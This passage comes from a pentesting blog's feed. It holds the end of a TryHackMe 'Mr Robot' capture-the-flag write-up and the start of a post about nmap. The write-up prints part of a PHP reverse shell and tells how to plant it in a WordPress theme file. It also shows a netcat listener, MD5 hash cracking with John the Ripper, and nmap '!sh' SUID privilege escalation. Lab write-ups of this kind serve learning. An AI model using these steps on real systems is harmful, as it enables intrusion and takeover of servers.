+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// If we can read from the process&amp;#39;s STDERR
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// send data down tcp connection
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">in_array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$read_a&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$debug&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">printit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;STDERR READ&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$input&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">fread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$chunk_size&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$debug&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">printit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;STDERR: &lt;/span>&lt;span class="si">$input&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fwrite&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$sock&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$input&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">fclose&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$sock&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">fclose&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">fclose&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">fclose&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">proc_close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$process&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Like print, but does nothing if we&amp;#39;ve daemonised ourself
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// (I can&amp;#39;t figure out how to redirect STDOUT like a proper daemon)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">function&lt;/span> &lt;span class="nf">printit&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nv">$daemon&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">print&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">$string\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>As an administrator we can do anything we want so let&amp;rsquo;s edit the theme files, to our advantage, giving for example the &lt;code>author-bio.php&lt;/code> file for our reverse shell, meaning that instead of displaying the biography of the author it will now run a reverse shell for us!&lt;/p>
+&lt;p>&lt;img src="https://crazyc4t.xyz/images/mrrobot4.png"
+loading="lazy"
+alt="mrrobot4"
+>&lt;/p>
+&lt;p>Before going to that specific page, we need to be listening in our host machine, listening meaning that we need to be ready for receiving the shell that our target is sending to us, that&amp;rsquo;s why it&amp;rsquo;s a reverse shell, now with netcat we can do:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lnvp &lt;span class="m">443&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Their flags meaning:&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>l&lt;/code>: Listen for inbound connections&lt;/li>
+&lt;li>&lt;code>n&lt;/code>: Numeric only IP addresses&lt;/li>
+&lt;li>&lt;code>v&lt;/code>: verbose&lt;/li>
+&lt;li>&lt;code>p&lt;/code>: Port specified&lt;/li>
+&lt;/ul>
+&lt;p>In my case I&amp;rsquo;m using the port 443, commonly known as the HTTPS port for listening, when we go to the specific page that would be in the themes directory since we modified the &amp;ldquo;TwentyFifteen&amp;rdquo; theme &lt;code>/wp-content/themes/twentyfifteen/author-bio.php&lt;/code> we will get a blank screen, that&amp;rsquo;s because no error happened, and we should get the shell back!&lt;/p>
+&lt;p>&lt;img src="https://crazyc4t.xyz/images/mrrobot5.png"
+loading="lazy"
+alt="mrrobot5"
+>&lt;/p>
+&lt;p>We are in their system! But there&amp;rsquo;s still work left to do, since we are the &amp;ldquo;daemon&amp;rdquo; user, (daemon means process running in linux) we need to escalate our privilages, first, let&amp;rsquo;s head home!&lt;/p>
+&lt;p>&lt;img src="https://crazyc4t.xyz/images/mrrobot6.png"
+loading="lazy"
+alt="mrrobot6"
+>&lt;/p>
+&lt;p>Being home we now know that we have another user in the system that is robot, and they have the second key that we need! But if we cat it out we will not have the permissions due to the fact we are not robot, but robot has a backup of his password hehehe, giving us access to change users, but is hashed! so we need to de-hash it first to get access to the password.&lt;/p>
+&lt;h3 id="john-the-ripper">John the ripper&lt;/h3>
+&lt;p>Let&amp;rsquo;s rip that out! We are going to use John the ripper, that is a cracker, for this case to crack that cryptographic algorithm that is MD5 what it was used to hash the password.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">john passmd5.hash --wordlist&lt;span class="o">=&lt;/span>fsocity.dic --format&lt;span class="o">=&lt;/span>Raw-MD5
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Before running this command I have created a file called &lt;code>passmd5.hash&lt;/code> where is the hash stored, and I have the &lt;code>fsocity.dic&lt;/code> from the &lt;code>robots.txt&lt;/code> giving us the password:
+&lt;img src="https://crazyc4t.xyz/images/mrrobot7.png"
+loading="lazy"
+alt="mrrobot7"
+>&lt;/p>
+&lt;p>Being the full alphabet! Now we can switch users! Let&amp;rsquo;s use &lt;code>su&lt;/code>
+&lt;img src="https://crazyc4t.xyz/images/mrrobot8.png"
+loading="lazy"
+alt="mrrobot8"
+>&lt;/p>
+&lt;p>But we get a problem, that is we are not running a fully interactive shell, so we need to upgrade our shell first, so we are going to do so by running a python one liner that spawns bash for us, then let&amp;rsquo;s switch users!&lt;/p>
+&lt;p>&lt;img src="https://crazyc4t.xyz/images/mrrobot9.png"
+loading="lazy"
+alt="mrrobot9"
+>&lt;/p>
+&lt;p>We are now robot! With that said, we can now cat out the key, giving us the second flag.&lt;/p>
+&lt;h3 id="nmap-exploit">Nmap exploit&lt;/h3>
+&lt;p>let&amp;rsquo;s get to know the system and know which programs does have root permissions:
+&lt;img src="https://crazyc4t.xyz/images/mrrobot10.png"
+loading="lazy"
+alt="mrrobot10"
+>&lt;/p>
+&lt;p>Being the command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">find / -user root -perm /4000 2&amp;gt; /dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Meaning, find all programs from the / directory with ownership of the user root, with the SUID of 4000 (can be used with root privilages without being root), and the errors throw them to nothingness (&lt;code>/dev/null&lt;/code>)&lt;/p>
+&lt;p>And we find &lt;code>nmap&lt;/code> in the list of programs that can run with root privilages without being root&amp;hellip;&lt;/p>
+&lt;p>This leaves me thinking, should I use a NSE script for this? Better, let&amp;rsquo;s GTFO of this restrictive shell with &lt;a class="link" href="https://gtfobins.github.io/" target="_blank" rel="noopener"
+>https://gtfobins.github.io/&lt;/a> !&lt;/p>
+&lt;p>That webpage is a repository full of unix functions that we can use to our advantage to escape restrictive shells and elevate our privilages &amp;ldquo;exploiting&amp;rdquo; bad configuration of permissions, etc&amp;hellip;&lt;/p>
+&lt;p>For example, I&amp;rsquo;m going to use the shell function to get a privilaged shell from nmap, using:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap --interactive
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nmap&amp;gt; !sh
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Getting root privilages on the machine, now let&amp;rsquo;s find the root flag that is not so hard to do:
+&lt;img src="https://crazyc4t.xyz/images/mrrobot11.png"
+loading="lazy"
+alt="mrrobot11"
+>&lt;/p>
+&lt;p>Finally getting the third and last flag, and completing the machine.&lt;/p>
+&lt;h2 id="outro">Outro&lt;/h2>
+&lt;p>&lt;img src="https://crazyc4t.xyz/images/mrrobot12.png"
+loading="lazy"
+alt="mrrobot12"
+>&lt;/p>
+&lt;p>Wow, I just loved this machine, for real wow this was really fun and challenging, this feels rewarding since I have just started to learn pentesting and to do all this by myself it&amp;rsquo;s awesome, this machine was really fun and I learned a ton from this machine.&lt;/p>
+&lt;p>When completing this machine you earn this &lt;a class="link" href="https://tryhackme.com/crazyc4t/badges/mr-robot" target="_blank" rel="noopener"
+>badge&lt;/a>.&lt;/p>
+&lt;p>Thanks all of you for reading my blog, I&amp;rsquo;m really thankful and blessed for this, for you and for the great work we are putting into, I&amp;rsquo;m preparing my first youtube &amp;amp; odysee video soon! So tune up for that!&lt;/p></description></item><item><title>Deep dive into nmap</title><link>https://crazyc4t.xyz/blog/nmap/</link><pubDate>Sat, 05 Nov 2022 13:17:13 -0500</pubDate><guid>https://crazyc4t.xyz/blog/nmap/</guid><description>&lt;img src="https://crazyc4t.xyz/images/nmaplogo.jpg" alt="Featured image of post Deep dive into nmap" />&lt;p>When it comes to hacking, knowledge is power, the more you know, the more options you have to attack, making critical a proper enumeration before any type of exploitation.&lt;/p>
 &lt;p>Before attacking our target we need to know what is what we are about to attack, we need to know what type of services or OS is running, and we can accomplish that by making a network map, hence the name of Nmap, specifically doing &amp;ldquo;port scanning&amp;rdquo;, because these services are listening on a specific &amp;ldquo;ports&amp;rdquo; of the network, being ports a network structure your service runs on to establish a connection, the service are always &amp;ldquo;listening&amp;rdquo; (waiting for another device that wants to establish a connection) and the user when connecting to the specific port they open a port for receiving information from the other port (for example: HTTPS 443)&lt;/p>
 &lt;p>&lt;img src="https://crazyc4t.xyz/images/nmap.png"
 loading="lazy"
